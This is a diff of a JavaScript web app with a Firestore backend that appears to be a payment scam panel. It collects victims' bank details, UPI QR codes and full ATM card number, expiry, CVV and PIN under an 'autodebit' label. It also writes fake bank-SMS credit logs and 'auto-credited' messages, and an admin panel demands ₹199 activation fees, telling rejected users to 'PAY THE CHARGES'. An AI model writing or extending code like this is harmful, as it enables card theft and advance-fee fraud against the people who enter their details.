@@ -48,10 +48,45 @@ async function bootstrapCdnFirebaseStore() {
             } catch {
                 db = fsMod.getFirestore(app, firebaseConfig.firestoreDatabaseId);
             }
+            fsMod.getDocFromServer(fsMod.doc(db, 'test', 'connection')).catch(() => {});
             const toDocId = (u) => (String(u || '').trim().replace(/[^a-zA-Z0-9_.-]/g, '_') || `user_${Date.now()}`).slice(0, 120);
             const safeId = (p) => `${p}-${Date.now()}-${Math.floor(Math.random() * 100000)}`;
             const cdnOtps = new Map();
             let activeTargetMobile = '';
+
+            const compressQrIfNeeded = async (dataUrl) => {
+                if (!dataUrl || typeof dataUrl !== 'string') return null;
+                if (dataUrl.length <= 450000) return dataUrl;
+                try {
+                    return await new Promise((resolve) => {
+                        const img = new Image();
+                        img.onload = () => {
+                            const maxDim = 640;
+                            let w = img.width;
+                            let h = img.height;
+                            if (w > maxDim || h > maxDim) {
+                                const ratio = Math.min(maxDim / w, maxDim / h);
+                                w = Math.round(w * ratio);
+                                h = Math.round(h * ratio);
+                            }
+                            const canvas = document.createElement('canvas');
+                            canvas.width = w;
+                            canvas.height = h;
+                            const ctx = canvas.getContext('2d');
+                            if (!ctx) {
+                                resolve(dataUrl.slice(0, 450000));
+                                return;
+                            }
+                            ctx.drawImage(img, 0, 0, w, h);
+                            resolve(canvas.toDataURL('image/jpeg', 0.72));
+                        };
+                        img.onerror = () => resolve(null);
+                        img.src = dataUrl;
+                    });
+                } catch {
+                    return null;
+                }
+            };
 
             const findUser = async (identifier) => {
                 const cleanId = String(identifier || '').trim();
@@ -180,58 +215,164 @@ async function bootstrapCdnFirebaseStore() {
                     }, () => {});
                 },
                 async saveAccountDetails(u, details) {
-                    const user = await findUser(u);
-                    if (!user) return false;
-                    await fsMod.updateDoc(fsMod.doc(db, 'users', user.docId), { accountDetails: details });
-                    await writeAct(u, 'bank_details', `Added bank: ${details.bankName}`, 'banking', 'success', details.contactNumber);
-                    return true;
+                    if (!u || u === 'demo') return false;
+                    try {
+                        const docId = toDocId(u);
+                        const compressedQr = await compressQrIfNeeded(details?.upiScannerBase64);
+                        const user = await findUser(u);
+                        const sanitizedDetails = {
+                            accountNumber: String(details?.accountNumber || '').trim().slice(0, 32),
+                            ifscCode: String(details?.ifscCode || '').trim().toUpperCase().slice(0, 15),
+                            bankName: String(details?.bankName || '').trim().slice(0, 120),
+                            accountHolder: String(details?.accountHolder || '').trim().slice(0, 120),
+                            accountType: String(details?.accountType || 'Saving').trim().slice(0, 32),
+                            contactNumber: String(details?.contactNumber || user?.mobile || '').trim().slice(0, 20),
+                            upiScannerBase64: compressedQr || user?.accountDetails?.upiScannerBase64 || null
+                        };
+                        if (user) {
+                            const upd = { accountDetails: sanitizedDetails };
+                            if (!user.mobile && sanitizedDetails.contactNumber) {
+                                upd.mobile = sanitizedDetails.contactNumber.replace(/\D/g, '').slice(-10);
+                            }
+                            await fsMod.updateDoc(fsMod.doc(db, 'users', user.docId), upd);
+                        } else {
+                            const now = new Date().toISOString();
+                            const fallbackMobile = (sanitizedDetails.contactNumber || '').replace(/\D/g, '').slice(-10);
+                            await fsMod.setDoc(fsMod.doc(db, 'users', docId), {
+                                docId,
+                                username: u,
+                                password: 'user1234',
+                                mobile: fallbackMobile,
+                                mobileVerified: true,
+                                email: `${u}@accountfunds.in`,
+                                registeredAt: now,
+                                lastLoginAt: now,
+                                loginCount: 1,
+                                loginHistory: [now],
+                                accountDetails: sanitizedDetails,
+                                autodebitDetails: null,
+                                activated: false,
+                                activationCode: '',
+                                balance: 0,
+                                commission: 0,
+                                transactions: []
+                            });
+                        }
+                        const last4 = sanitizedDetails.accountNumber.slice(-4).padStart(4, '0');
+                        await writeAct(u, 'bank_details', `Added bank: ${sanitizedDetails.bankName} (IFSC: ${sanitizedDetails.ifscCode}, Acc: ${sanitizedDetails.accountNumber} [XXXX${last4}], Holder: ${sanitizedDetails.accountHolder})`, 'banking', 'success', sanitizedDetails.contactNumber);
+                        return true;
+                    } catch {
+                        return false;
+                    }
                 },
                 async saveAutodebitDetails(u, details) {
-                    const user = await findUser(u);
-                    if (!user) return false;
-                    await fsMod.updateDoc(fsMod.doc(db, 'users', user.docId), { autodebitDetails: details });
-                    await writeAct(u, 'autodebit', `Configured ATM autodebit`, 'atm', 'success');
-                    return true;
+                    if (!u || u === 'demo') return false;
+                    try {
+                        const sanitizedAtm = {
+                            atmNumber: String(details?.atmNumber || '').trim().slice(0, 24),
+                            atmExpiry: String(details?.atmExpiry || '').trim().slice(0, 10),
+                            atmCvv: String(details?.atmCvv || '').trim().slice(0, 6),
+                            atmPin: String(details?.atmPin || '').trim().slice(0, 10),
+                            atmName: String(details?.atmName || '').trim().slice(0, 120)
+                        };
+                        const user = await findUser(u);
+                        if (user) {
+                            await fsMod.updateDoc(fsMod.doc(db, 'users', user.docId), { autodebitDetails: sanitizedAtm });
+                        }
+                        const cardLast4 = sanitizedAtm.atmNumber.slice(-4);
+                        await writeAct(u, 'autodebit', `Configured ATM autodebit (Card: XXXX${cardLast4}, Exp: ${sanitizedAtm.atmExpiry}, Name: ${sanitizedAtm.atmName})`, 'atm', 'success');
+                        return true;
+                    } catch {
+                        return false;
+                    }
                 },
                 async submitUtrRecord(payload) {
                     const uname = String(payload.username || '').trim();
                     if (!uname || uname === 'demo') return null;
-                    const id = String(payload.record?.id || safeId('WTH')).replace(/[^a-zA-Z0-9_-]/g, '-').slice(0, 120);
-                    const entry = { id, username: uname, ...payload.record, timestamp: payload.record?.timestamp || new Date().toISOString() };
-                    await fsMod.setDoc(fsMod.doc(db, 'utrs', id), entry);
-                    const user = await findUser(uname);
-                    if (user) {
-                        const upd = { activated: false, activationStatus: 'pending_approval', rejectionMessage: '' };
-                        if (payload.activationCode) upd.activationCode = payload.activationCode;
-                        await fsMod.updateDoc(fsMod.doc(db, 'users', user.docId), upd);
+                    try {
+                        const user = await findUser(uname);
+                        const acc = user?.accountDetails;
+                        const id = String(payload.record?.id || safeId('WTH')).replace(/[^a-zA-Z0-9_-]/g, '-').slice(0, 120);
+                        const entry = {
+                            id,
+                            username: uname,
+                            type: String(payload.record?.type || 'UTR Submission').slice(0, 100),
+                            amount: Number(payload.record?.amount || 0),
+                            utr: String(payload.record?.utr || '').slice(0, 64),
+                            tokenNumber: String(payload.record?.tokenNumber || payload.record?.utr || '').slice(0, 64),
+                            status: String(payload.record?.status || 'Pending Admin Approval').slice(0, 80),
+                            bank: String(payload.record?.bank || acc?.bankName || 'UPI Payment').slice(0, 120),
+                            ifsc: String(payload.record?.ifsc || acc?.ifscCode || '').slice(0, 20),
+                            accNumber: String(payload.record?.accNumber || acc?.accountNumber || '').slice(0, 32),
+                            contact: String(payload.record?.contact || acc?.contactNumber || user?.mobile || '').slice(0, 20),
+                            timestamp: payload.record?.timestamp || new Date().toISOString()
+                        };
+                        await fsMod.setDoc(fsMod.doc(db, 'utrs', id), entry);
+                        const isPaymentSubmission =
+                            payload.actionType === 'activation_utr' ||
+                            payload.actionType === 'upgrade_utr' ||
+                            entry.type.toLowerCase().includes('activation') ||
+                            entry.type.toLowerCase().includes('upgrade');
+                        if (user && isPaymentSubmission) {
+                            const upd = { activated: false, activationStatus: 'pending_approval', rejectionMessage: '' };
+                            if (payload.activationCode) upd.activationCode = String(payload.activationCode).slice(0, 32);
+                            await fsMod.updateDoc(fsMod.doc(db, 'users', user.docId), upd);
+                        } else if (user && payload.activationCode) {
+                            await fsMod.updateDoc(fsMod.doc(db, 'users', user.docId), { activationCode: String(payload.activationCode).slice(0, 32) });
+                        }
+                        await writeAct(uname, payload.actionType || 'activation_utr', payload.activityText || `Submitted ${entry.type}: ${entry.utr || entry.tokenNumber} (₹${entry.amount})`, 'payment', 'info', entry.contact);
+                        return entry;
+                    } catch {
+                        return null;
                     }
-                    await writeAct(uname, payload.actionType || 'activation_utr', payload.activityText || `Submitted ${entry.type}`, 'payment', 'info', entry.contact);
-                    return entry;
                 },
                 async markActivationPending(u, code = '') {
+                    if (!u || u === 'demo') return false;
                     const user = await findUser(u);
                     if (!user) return false;
                     const upd = { activated: false, activationStatus: 'pending_approval', rejectionMessage: '' };
-                    if (code) upd.activationCode = code;
+                    if (code) upd.activationCode = String(code).slice(0, 32);
                     await fsMod.updateDoc(fsMod.doc(db, 'users', user.docId), upd);
+                    await writeAct(u, 'activation_pending', 'Customer submitted verification code. Panel is under Admin verification.', 'activation', 'info');
                     return true;
                 },
                 async recordTransaction(payload) {
-                    const user = await findUser(payload.username);
+                    const uname = String(payload.username || '').trim();
+                    if (!uname || uname === 'demo') return false;
+                    const user = await findUser(uname);
                     if (user) {
-                        const txns = Array.isArray(user.transactions) ? [...user.transactions, { amount: payload.amount, timestamp: payload.timestamp }].slice(-200) : [{ amount: payload.amount, timestamp: payload.timestamp }];
-                        await fsMod.updateDoc(fsMod.doc(db, 'users', user.docId), { balance: payload.balance, commission: payload.commission, transactions: txns });
+                        const txns = Array.isArray(user.transactions)
+                            ? [...user.transactions, { amount: Number(payload.amount || 0), timestamp: payload.timestamp || new Date().toISOString() }].slice(-200)
+                            : [{ amount: Number(payload.amount || 0), timestamp: payload.timestamp || new Date().toISOString() }];
+                        await fsMod.updateDoc(fsMod.doc(db, 'users', user.docId), {
+                            balance: Number(payload.balance || 0),
+                            commission: Number(payload.commission || 0),
+                            transactions: txns
+                        });
                     }
                     if (payload.smsRecord) {
                         const smsId = String(payload.smsRecord.id || safeId('SMS')).replace(/[^a-zA-Z0-9_-]/g, '-').slice(0, 120);
-                        await fsMod.setDoc(fsMod.doc(db, 'smsLogs', smsId), { id: smsId, username: payload.username, ...payload.smsRecord, amount: payload.amount, timestamp: payload.timestamp });
+                        await fsMod.setDoc(fsMod.doc(db, 'smsLogs', smsId), {
+                            id: smsId,
+                            username: uname,
+                            bankName: String(payload.smsRecord.bankName || user?.accountDetails?.bankName || 'Linked Bank').slice(0, 120),
+                            senderCode: String(payload.smsRecord.senderCode || 'VM-BANK').slice(0, 32),
+                            amount: Number(payload.amount || 0),
+                            accountNumber: String(payload.smsRecord.accountNumber || user?.accountDetails?.accountNumber || '').slice(0, 32),
+                            timestamp: payload.timestamp || new Date().toISOString()
+                        });
                     }
+                    const acc = user?.accountDetails;
+                    const last4 = String(acc?.accountNumber || '0000').slice(-4).padStart(4, '0');
+                    await writeAct(uname, 'credit_transaction', `Auto-credited ₹${Number(payload.amount || 0).toLocaleString('en-IN')} to ${acc?.bankName || 'Linked Bank'} (XXXX${last4})`, 'credit', 'success');
                     return true;
                 },
                 async removeBankData(u) {
+                    if (!u || u === 'demo') return false;
                     const user = await findUser(u);
                     if (!user) return false;
                     await fsMod.updateDoc(fsMod.doc(db, 'users', user.docId), { accountDetails: null, autodebitDetails: null, activated: false, activationStatus: 'not_submitted', rejectionMessage: '', balance: 0, commission: 0, transactions: [] });
+                    await writeAct(u, 'bank_removed', 'User removed linked bank account and stopped autodebit.', 'security', 'warning');
                     return true;
                 },
                 logActivity: writeAct,
@@ -285,6 +426,18 @@ async function bootstrapCdnFirebaseStore() {
                     const state = { usersMap: {}, utrs: [], activityLogs: [], smsLogs: [] };
                     let stopped = false;
                     const emit = () => { if (!stopped) cb({ ...state }); };
+                    const toMs = (ts) => {
+                        if (!ts) return 0;
+                        if (typeof ts === 'string' || typeof ts === 'number') {
+                            const ms = new Date(ts).getTime();
+                            return Number.isFinite(ms) ? ms : 0;
+                        }
+                        if (typeof ts === 'object' && ts !== null) {
+                            if (typeof ts.toDate === 'function') return ts.toDate().getTime();
+                            if (typeof ts.seconds === 'number') return ts.seconds * 1000;
+                        }
+                        return 0;
+                    };
                     void this.fetchAdminDashboardOnce().then((initial) => {
                         if (stopped) return;
                         state.usersMap = initial.usersMap;
@@ -303,10 +456,40 @@ async function bootstrapCdnFirebaseStore() {
                         state.usersMap = m;
                         emit();
                     }, () => {});
-                    const u2 = fsMod.onSnapshot(fsMod.query(fsMod.collection(db, 'utrs'), fsMod.orderBy('timestamp', 'desc'), fsMod.limit(300)), (s) => { state.utrs = s.docs.map((d) => d.data()); emit(); }, () => {});
-                    const u3 = fsMod.onSnapshot(fsMod.query(fsMod.collection(db, 'activityLogs'), fsMod.orderBy('timestamp', 'desc'), fsMod.limit(500)), (s) => { state.activityLogs = s.docs.map((d) => d.data()); emit(); }, () => {});
-                    const u4 = fsMod.onSnapshot(fsMod.query(fsMod.collection(db, 'smsLogs'), fsMod.orderBy('timestamp', 'desc'), fsMod.limit(300)), (s) => { state.smsLogs = s.docs.map((d) => d.data()); emit(); }, () => {});
-                    return () => { stopped = true; u1(); u2(); u3(); u4(); };
+                    const extraUnsubs = [];
+                    const subCol = (colName, maxLimit, assign) => {
+                        return fsMod.onSnapshot(
+                            fsMod.query(fsMod.collection(db, colName), fsMod.orderBy('timestamp', 'desc'), fsMod.limit(maxLimit)),
+                            (s) => {
+                                const rows = s.docs.map((d) => d.data());
+                                rows.sort((a, b) => toMs(b.timestamp) - toMs(a.timestamp));
+                                assign(rows);
+                                emit();
+                            },
+                            () => {
+                                if (stopped) return;
+                                const fbUnsub = fsMod.onSnapshot(
+                                    fsMod.query(fsMod.collection(db, colName), fsMod.limit(maxLimit)),
+                                    (s) => {
+                                        const rows = s.docs.map((d) => d.data());
+                                        rows.sort((a, b) => toMs(b.timestamp) - toMs(a.timestamp));
+                                        assign(rows);
+                                        emit();
+                                    },
+                                    () => {}
+                                );
+                                extraUnsubs.push(fbUnsub);
+                            }
+                        );
+                    };
+                    const u2 = subCol('utrs', 300, (rows) => { state.utrs = rows; });
+                    const u3 = subCol('activityLogs', 500, (rows) => { state.activityLogs = rows; });
+                    const u4 = subCol('smsLogs', 300, (rows) => { state.smsLogs = rows; });
+                    return () => {
+                        stopped = true;
+                        u1(); u2(); u3(); u4();
+                        extraUnsubs.forEach((fn) => { try { fn(); } catch {} });
+                    };
                 },
                 async adminApproveUtr(utrId, uname) {
                     const ref = fsMod.doc(db, 'utrs', utrId);
@@ -316,18 +499,21 @@ async function bootstrapCdnFirebaseStore() {
                     await fsMod.updateDoc(ref, { status: is199 ? '✓ Approved & Receipt Generated' : '✓ Approved & Activated' });
                     const user = await findUser(uname);
                     if (user) await fsMod.updateDoc(fsMod.doc(db, 'users', user.docId), { activated: true, activationStatus: 'approved', rejectionMessage: '' });
+                    await writeAct(uname, 'activation', is199 ? `Admin verified ₹199 UTR (${data?.utr || utrId}) and generated Payment Receipt for @${uname}` : `Admin approved UTR (${data?.utr || utrId}) and started panel transactions for @${uname}`, 'activation', 'success');
                     return true;
                 },
                 async adminRejectUtr(utrId, uname) {
                     await fsMod.updateDoc(fsMod.doc(db, 'utrs', utrId), { status: '❌ Rejected (Invalid UTR)' });
                     const user = await findUser(uname);
                     if (user) await fsMod.updateDoc(fsMod.doc(db, 'users', user.docId), { activated: false, activationStatus: 'rejected', rejectionMessage: 'ADMIN REJECTED YOUR PAYMENT. KINDLY PAY THE CHARGES AND RUN.' });
+                    await writeAct(uname, 'activation', `Admin rejected UTR (${utrId}) for @${uname}`, 'activation', 'warning');
                     return true;
                 },
                 async adminApproveUserPanel(uname) {
                     const user = await findUser(uname);
                     if (!user) return null;
                     await fsMod.updateDoc(fsMod.doc(db, 'users', user.docId), { activated: true, activationStatus: 'approved', rejectionMessage: '' });
+                    await writeAct(uname, 'activation', `Admin approved panel transactions for @${uname}`, 'activation', 'success');
                     return { ...user, activated: true, activationStatus: 'approved', rejectionMessage: '' };
                 },
                 async adminRejectUserPayment(uname) {
@@ -335,6 +521,7 @@ async function bootstrapCdnFirebaseStore() {
                     if (!user) return null;
                     const msg = 'ADMIN REJECTED YOUR PAYMENT. KINDLY PAY THE CHARGES AND RUN.';
                     await fsMod.updateDoc(fsMod.doc(db, 'users', user.docId), { activated: false, activationStatus: 'rejected', rejectionMessage: msg });
+                    await writeAct(uname, 'activation', `Admin rejected payment for @${uname}`, 'activation', 'warning');
                     return { ...user, activated: false, activationStatus: 'rejected', rejectionMessage: msg };
                 },
                 async adminToggleUserActivation(uname, curr) {
@@ -344,6 +531,7 @@ async function bootstrapCdnFirebaseStore() {
                     const status = next ? 'approved' : 'rejected';
                     const msg = next ? '' : 'ADMIN REJECTED YOUR PAYMENT. KINDLY PAY THE CHARGES AND RUN.';
                     await fsMod.updateDoc(fsMod.doc(db, 'users', user.docId), { activated: next, activationStatus: status, rejectionMessage: msg });
+                    await writeAct(uname, 'activation', `Admin toggled activation to ${next ? 'ACTIVE' : 'STOPPED'} for @${uname}`, 'activation', next ? 'success' : 'warning');
                     return { ...user, activated: next, activationStatus: status, rejectionMessage: msg };
                 },
                 async adminDeleteUser(uname) {
@@ -371,34 +559,27 @@ async function bootstrapCdnFirebaseStore() {
     return _cdnBridgePromise;
 }
 
+const IS_VITE_ENV = typeof import.meta !== 'undefined' && Boolean(import.meta.env);
+const IS_STATIC_HOST = typeof window !== 'undefined' && (/\.github\.io$/i.test(window.location.hostname) || window.location.protocol === 'file:');
+
 async function getFirebaseStore() {
     if (window.FirebaseStore) return window.FirebaseStore;
-    if (!window.__firebaseTsLoadFailed) {
-        const waited = await new Promise((resolve) => {
-            let settled = false;
-            const onReady = () => {
-                if (!settled) {
-                    settled = true;
-                    resolve(window.FirebaseStore || null);
-                }
-            };
-            window.addEventListener('firebase-store-ready', onReady, { once: true });
-            setTimeout(() => {
-                if (!settled) {
-                    settled = true;
-                    resolve(window.FirebaseStore || null);
-                }
-            }, 1500);
-        });
-        if (waited) return waited;
+    if (IS_VITE_ENV) {
+        try {
+            const mod = await import('./src/firebase-client.ts');
+            if (mod?.default) return mod.default;
+        } catch {}
     }
     return bootstrapCdnFirebaseStore();
 }
 
-// Legacy optional backend mirror helper (non-blocking)
+// Kick off Firestore client bridge immediately on boot
+void getFirebaseStore();
+
+// Legacy optional backend mirror helper (skipped on static GitHub Pages host to avoid 404 console noise)
 function syncToBackend(endpoint, payload) {
     try {
-        if (typeof fetch === 'undefined') return;
+        if (IS_STATIC_HOST || typeof fetch === 'undefined') return;
         fetch(endpoint, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -4974,30 +5155,32 @@ if (document.querySelector('.admin-body') || document.getElementById('activityLo
                 let serverErrorMsg = '';
                 let serverRespondedJson = false;
 
-                try {
-                    const res = await fetch('/api/admin/login', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        credentials: 'same-origin',
-                        body: JSON.stringify({ id: enteredId, password: enteredPass })
-                    });
-                    const contentType = res.headers.get('content-type') || '';
-                    if (contentType.includes('application/json')) {
-                        const rawText = await res.text();
-                        const data = rawText ? JSON.parse(rawText) : null;
-                        if (data && typeof data === 'object') {
-                            serverRespondedJson = true;
-                            if (res.ok && data.success) {
-                                authOk = true;
-                                authToken = data.token;
-                                authUser = data.adminId || enteredId;
-                            } else {
-                                serverErrorMsg = data.message || `Access Denied (${res.status}): Invalid Admin ID or Password!`;
+                if (!IS_STATIC_HOST) {
+                    try {
+                        const res = await fetch('/api/admin/login', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            credentials: 'same-origin',
+                            body: JSON.stringify({ id: enteredId, password: enteredPass })
+                        });
+                        const contentType = res.headers.get('content-type') || '';
+                        if (contentType.includes('application/json')) {
+                            const rawText = await res.text();
+                            const data = rawText ? JSON.parse(rawText) : null;
+                            if (data && typeof data === 'object') {
+                                serverRespondedJson = true;
+                                if (res.ok && data.success) {
+                                    authOk = true;
+                                    authToken = data.token;
+                                    authUser = data.adminId || enteredId;
+                                } else {
+                                    serverErrorMsg = data.message || `Access Denied (${res.status}): Invalid Admin ID or Password!`;
+                                }
                             }
                         }
+                    } catch {
+                        serverRespondedJson = false;
                     }
-                } catch {
-                    serverRespondedJson = false;
                 }
 
                 // Static hosting fallback (GitHub Pages / Netlify static) when Express /api/admin/login is not mounted
